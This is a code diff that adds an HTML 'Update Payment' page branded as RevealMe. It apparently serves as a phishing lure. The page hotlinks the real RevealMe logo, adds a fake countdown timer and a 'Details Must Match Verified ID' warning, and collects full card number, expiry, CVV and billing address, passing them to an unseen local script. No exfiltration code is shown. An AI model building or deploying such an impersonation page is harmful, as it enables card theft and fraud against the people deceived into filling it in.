@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RevealMe - Update Payment</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+</head>
+<body class="darkmode01 page_payment">
+    <div class="container-outer">
+        <div class="container-inner">
+            <a class="logoa" href="#"><img src="https://revealme.com/includes/media/revealme_logo_high_white_3.png" alt="RevealMe Logo" class="logo" onerror="this.src='/fallback-logo.png'"></a>
+            <div class="container-payment">
+                <a class="cancel" href="/">Cancel & go back</a>
+                <div class="pay_wrapper">
+                    <div class="summary"><b> Update Card Info: 
+                    </b><br><i>Details Must Match Verified ID</i></div>
+                    <div id="timerOffer" style="font-weight: bold; padding-top:20px;" class="pulsate">Time Remaining 04:23:59:59</div>
+                    <div class="card-icons">
+                        <i class="fab fa-cc-mastercard"></i>
+                        <i class="fab fa-cc-visa"></i>
+                        <i class="fab fa-cc-amex"></i>
+                        <i class="fab fa-cc-stripe"></i>
+                    </div>
+                    <form id="payment-form">
+                        <div class="pay_wrapper_input_out">
+                            <div class="pay_wrapper_input">
+                                <div class="form-group">
+                                    <span class="title">Cardholder:</span>
+                                    <input type="text" name="cardholder" placeholder="Full Name" required>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">Card Number:</span>
+                                    <input type="text" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="16" required>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">Expiry:</span>
+                                    <div class="inline-inputs">
+                                        <input type="text" name="expiry" class="short-input" placeholder="MM/YY" maxlength="5" required>
+                                        <span class="title inline-title">CVV:</span>
+                                        <input type="text" name="cvv" class="short-input" placeholder="1234" maxlength="4" required>
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">Address:</span>
+                                    <input type="text" name="address" placeholder="Billing Address" required>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">State:</span>
+                                    <input type="text" name="state" placeholder="State/Province" required>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">Zip Code:</span>
+                                    <input type="text" name="zip" placeholder="Postal/ZIP Code" required>
+                                </div>
+                                <div class="form-group">
+                                    <span class="title">Country:</span>
+                                    <input type="text" name="country" placeholder="Country" required>
+                                </div>
+                            </div>
+                        </div>
+                        <button type="submit" class="btn goldvariant05">Update Payment</button>
+                    </form>
+                    <p class="success hidden" id="payment-success">Payment updated successfully!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/script.js"></script>
+</body>
+</html>
